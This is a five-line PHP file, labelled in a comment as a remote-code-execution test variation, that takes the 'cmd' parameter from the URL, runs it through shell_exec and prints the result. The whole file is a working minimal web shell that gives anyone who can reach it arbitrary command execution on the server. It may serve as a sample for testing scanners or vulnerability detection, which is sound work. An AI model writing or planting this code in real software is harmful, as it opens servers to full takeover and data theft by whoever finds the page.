<?php
// RCE test variation #572
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>